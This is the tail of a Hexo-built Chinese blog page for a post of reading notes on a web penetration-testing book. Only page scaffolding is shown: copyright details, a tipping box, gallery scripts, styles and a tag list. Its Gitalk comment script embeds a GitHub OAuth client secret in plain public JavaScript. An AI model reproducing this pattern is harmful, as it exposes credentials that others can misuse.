+    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span>文章标题:</span>《Web安全攻防-渗透测试实战指南》读书笔记</p>
+    <p><span>文章字数:</span><span class="post-count">11,413</span></p>
+    <p><span>本文作者:</span><a href="javascript:void(0)" title="Bigbroke">Bigbroke</a></p>
+    <p><span>发布时间:</span>2018-10-26, 22:05:27</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:15</p>
+    <span>原始链接:</span><a class="post-url" href="/archis/924987ad/" title="《Web安全攻防-渗透测试实战指南》读书笔记">http://Bigbroke.com/archis/924987ad/</a>
+    <p>
+        <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="/css/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: 'eb679ffbe3e667bef087',
+            clientSecret: '803d24db3cf86013b1c74778931b9e6670081459',
+            repo: 'bigbroke.github.io',
+            owner: 'bigbroke',
+            admin: ['bigbroke'],
+            id: location.pathname,
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+    
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2018 Bigbroke</p>
+<p class="footer-entry">Buit with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":150},"mobile":{"show":true},"log":false});</script></body>
+<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe-ui-default.min.js"></script>
+
+<script src="/js/script.js"></script>
+<script>
+    var img_resize = 'photoSwipe';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#思考','#life','#正则','#WP','#first-blog','#ctf','#代码审计','#sqlilabs','#sqlmap','#cve','#VIM','#Nmap','#密码学','#hexo','#Nikto','#TCPDUMP','#QWASP_ZAP','#NETCAT','#docker','#Skipfish','#Vega','#复现','#文件包含','#读书摘要','#信息收集','#Web漏洞','#内网','#CTF','#文件上传','#渗透','#web','#黑客攻防web安全实战详解','#入侵','#Dvwa',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1;
+            var $numbering = $('<ul/>').addClass('pre-numbering').attr("unselectable","on");
+            $(this).addClass('has-numbering')
+                    .parent()
+                    .append($numbering);
+            for(i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info//busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+
+        // PhotoSwipe
+        $('article').each(function(i){
+            $(this).find('img').each(function(){
+                if ($(this).closest('figure').hasClass('article-gallery-img')) {
+                    return;
+                }
+                var alt = this.alt;
+                $(this)
+                    .wrap('<figure class="article-gallery-img" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"></figure>')
+                    .wrap('<a href="' + this.src + '" title="' + alt + '"></a>');
+                $(this).after('<div class="img_alt"><span>' + (alt || '') + '</span></div>');
+            });
+        });
+
+        var pswpElement = document.querySelectorAll('.pswp')[0];
+        if (pswpElement) {
+            var gallerySelector = '.article-gallery, article';
+
+            var initPhotoSwipeFromDOM = function(gallerySelector) {
+
+                // parse slide data (url, title, size ...) from DOM elements
+                // (children of gallerySelector)
+                var parseThumbnailElements = function(el) {
+                    var thumbElements = $(el).find('figure.article-gallery-img').toArray(),
+                        numNodes = thumbElements.length,
+                        items = [],
+                        figureEl,
+                        linkEl,
+                        size,
+                        imgEl,
+                        item;
+
+                    for (var i = 0; i < numNodes; i++) {
+
+                        figureEl = thumbElements[i]; // <figure> element
+
+                        // include only element nodes
+                        if (figureEl.nodeType !== 1) {
+                            continue;
+                        }
+
+                        linkEl = figureEl.children[0]; // <a> element
+                        imgEl = linkEl.children[0]; // <img>
+
+                        size = linkEl.getAttribute('data-size');
+                        size = size && size.split('x');
+
+                        // create slide object
+                        item = {
+                            src: linkEl.getAttribute('href'),
+                            w: size && parseInt(size[0], 10) || imgEl.width,
+                            h: size && parseInt(size[1], 10) || imgEl.height
+                        };
+
+                        if (figureEl.children.length > 1) {
+                            // <figcaption> content
+                            item.title = figureEl.children[1].innerHTML;
+                        }
+
+                        if (linkEl.children.length > 0) {
+                            // <img> thumbnail element, retrieving thumbnail url
+                            item.msrc = linkEl.children[0].getAttribute('src');
+                        }
+
+                        item.el = figureEl; // save link to element for getThumbBoundsFn
+                        items.push(item);
+                    }
+
+                    return items;
+                };
+
+                // find nearest parent element
+                var closest = function closest(el, fn) {
+                    return el && (fn(el) ? el : closest(el.parentNode, fn));
+                };
+
+                // triggers when user clicks on thumbnail
+                var onThumbnailsClick = function(e) {
+                    e = e || window.event;
+
+                    var eTarget = e.target || e.srcElement;
+
+                    // find root element of slide
+                    var clickedListItem = closest(eTarget, function(el) {
+                        return (el.tagName && el.tagName.toUpperCase() === 'FIGURE');
+                    });
+
+                    if (!clickedListItem) {
+                        return;
+                    }
+
+                    if (e.preventDefault) {
+                        e.preventDefault();
+                    } else {
+                        e.returnValue = false;
+                    }
+
+                    // find index of clicked item by looping through all child nodes
+                    // alternatively, you may define index via data- attribute
+                    var clickedGallery = $(clickedListItem).closest(gallerySelector)[0],
+                        childNodes = $(clickedGallery).find('figure.article-gallery-img').toArray(),
+                        numChildNodes = childNodes.length,
+                        nodeIndex = 0,
+                        index;
+
+                    for (var i = 0; i < numChildNodes; i++) {
+                        if (childNodes[i].nodeType !== 1) {
+                            continue;
+                        }
+
+                        if (childNodes[i] === clickedListItem) {
+                            index = nodeIndex;
+                            break;
+                        }
+                        nodeIndex++;
+                    }
+
+
+
+                    if (index >= 0) {
+                        // open PhotoSwipe if valid index found
+                        openPhotoSwipe(index, clickedGallery);
+                    }
+                    return false;
+                };
+
+                // parse picture index and gallery index from URL (#&pid=1&gid=2)
+                var photoswipeParseHash = function() {
+                    var hash = window.location.hash.substring(1),
+                        params = {};
+
+                    if (hash.length < 5) {
+                        return params;
+                    }
+
+                    var vars = hash.split('&');
+                    for (var i = 0; i < vars.length; i++) {
+                        if (!vars[i]) {
+                            continue;
+                        }
+                        var pair = vars[i].split('=');
+                        if (pair.length < 2) {
+                            continue;
+                        }
+                        params[pair[0]] = pair[1];
+                    }
+
+                    if (params.gid) {
+                        params.gid = parseInt(params.gid, 10);
+                    }
+
+                    return params;
+                };
+
+                var openPhotoSwipe = function(index, galleryElement, disableAnimation, fromURL) {
+                    var pswpElement = document.querySelectorAll('.pswp')[0],
+                        gallery,
+                        options,
+                        items;
+
+                    items = parseThumbnailElements(galleryElement);
+
+                    // define options (if needed)
+                    options = {
+
+                        // define gallery index (for URL)
+                        galleryUID: galleryElement.getAttribute('data-pswp-uid'),
+
+                        getThumbBoundsFn: function(index) {
+                            // See Options -> getThumbBoundsFn section of documentation for more info
+                            var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail
+                                pageYScroll = window.pageYOffset || document.documentElement.scrollTop,
+                                rect = thumbnail.getBoundingClientRect();
+
+                            return {
+                                x: rect.left,
+                                y: rect.top + pageYScroll,
+                                w: rect.width
+                            };
+                        }
+                    };
+
+                    // PhotoSwipe opened from URL
+                    if (fromURL) {
+                        if (options.galleryPIDs) {
+                            // parse real index when custom PIDs are used
+                            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url
+                            for (var j = 0; j < items.length; j++) {
+                                if (items[j].pid == index) {
+                                    options.index = j;
+                                    break;
+                                }
+                            }
+                        } else {
+                            // in URL indexes start from 1
+                            options.index = parseInt(index, 10) - 1;
+                        }
+                    } else {
+                        options.index = parseInt(index, 10);
+                    }
+
+                    // exit if index not found
+                    if (isNaN(options.index)) {
+                        return;
+                    }
+
+                    if (disableAnimation) {
+                        options.showAnimationDuration = 0;
+                    }
+
+                    // Pass data to PhotoSwipe and initialize it
+                    gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);
+
+                    gallery.listen('imageLoadComplete', function(index, item) {
+                        var linkEl = item.el.children[0];
+                        var img = item.container.children[0];
+                        if (!linkEl.getAttribute('data-size')) {
+                            linkEl.setAttribute('data-size', img.naturalWidth + 'x' + img.naturalHeight);
+                            item.w = img.naturalWidth;
+                            item.h = img.naturalHeight;
+                            gallery.invalidateCurrItems();
+                            gallery.updateSize(true);
+                        }
+                    });
+
+                    gallery.init();
+                };
+
+                // loop through all gallery elements and bind events
+                var galleryElements = document.querySelectorAll(gallerySelector);
+
+                for (var i = 0, l = galleryElements.length; i < l; i++) {
+                    galleryElements[i].setAttribute('data-pswp-uid', i + 1);
+                    galleryElements[i].onclick = onThumbnailsClick;
+                }
+
+                // Parse URL and open gallery if it contains #&pid=3&gid=1
+                var hashData = photoswipeParseHash();
+                if (hashData.pid && hashData.gid) {
+                    openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);
+                }
+            };
+
+            // execute above function
+            initPhotoSwipeFromDOM(gallerySelector);
+        }
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 2px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 2px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /*引用块样式*/
+    
+    .post .pjax article blockquote {
+        padding: 10px 20px;
+        background-color: white;
+        border: none;
+        border-left: 4px solid #42b983;
+        border-right: 4px solid #42b983;
+        border-radius: 10px;
+    }
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.1;
+        background: url("http://oy0tigw51.bkt.clouddn.com/201711210136_683.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+</style>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element, as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. PhotoSwipe keeps only 3 slides in DOM to save memory. -->
+        <!-- don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+
+
+
+</html>
